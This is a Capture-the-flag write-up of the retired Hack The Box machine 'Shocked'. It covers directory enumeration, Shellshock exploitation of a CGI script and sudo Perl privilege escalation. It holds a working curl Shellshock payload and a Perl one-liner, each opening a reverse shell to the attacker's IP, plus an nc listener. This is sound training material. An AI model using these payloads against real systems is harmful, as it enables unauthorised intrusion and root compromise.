---
layout: single
title: Shocked Writeup
date: '2020-01-09 12:24:21'
tags:
- hack-the-box
classes: wide
sidebar:
  - title: "Difficulty: Easy"
    image: /images/posts/2020/2020-01-09-shocked-writeup/shocked.png
    text: "https://app.hackthebox.eu/machines/retired"
typora-copy-images-to: ../../images/posts/2020/${filename}/
---
A straightforward box that teaches you about a very common vulnerability from a few years ago.…

## Enumeration

Running the usual autorecon scan revealed that ports 80 & 2222 were open. Port 80 was running an Apache webserver, whilst port 2222 was running OpenSSH.

The webserver seemed the obvious place to start and revealed a site with an amusing image, but nothing interesting in the source or hidden in the JPEG image, which I ran `strings` over quickly.

Given nothing seemed to be obviously visible I then ran `dirbuster` over the webtree using the `directory-list-2.3-small.txt wordlist`.

This discovered that a `/cgi-bin` directory was present. I stopped the scan that was running over the whole tree and started a new scan restricted to `/cgi-bin` and looking for a number of common script file extensions:


![Screenshot-from-2020-01-09-11-53-04](../../images/posts/2020/2020-01-09-shocked-writeup/Screenshot-from-2020-01-09-11-53-04.png)

This quickly discovered `/cgi-bin/user.sh`. Going to the location showed this was a simple script to show the host uptime.

## Exploitation

Given the name of the server and the fact that the script appeared to be a shell script it seemed worth trying the [Shellshock](https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29) vulnerability.

We can try and invoke this by using

`curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.17/1234 0>&1' http://10.10.10.56/cgi-bin/user.sh`

which will try and exploit the vulnerability by sending the command we want to run in the User-Agent header. This will create a reverse shell back to our box and does indeed work when executed and gives us a shell as the `shelly` user and we can grab user.txt from /home/shelly.

## Escalation

Running `sudo -l` shows that shelly can run `/usr/bin/perl` as root with no password. Though it'd be easy just to grab the root.txt contents using Perl, it's more fun to get a root shell. We can use the Perl reverse shell below to grab this:
```bash
sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.17";$p=4096;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
with the a listener started with the usual `nc -lvp 4096`. This gets us a full root shell and we can cat `/root/root.txt`

